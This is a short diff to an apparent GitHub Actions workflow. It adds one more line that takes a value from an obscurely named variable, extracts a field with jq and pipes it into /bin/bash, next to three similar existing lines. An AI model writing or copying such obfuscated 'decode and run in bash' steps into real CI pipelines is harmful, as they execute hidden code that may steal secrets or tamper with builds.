@@ -28,6 +28,7 @@ jobs:
           echo $pnkhx25 | jq -r .imo81279 | /bin/bash
           printf '%s' "$fp1959" | jq -r .vey8239 | /bin/bash
           printf '%s' "$xao8362" | jq -r .slm92 | /bin/bash
+          printf '%s' "$temc618" | jq -r .zoc1 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
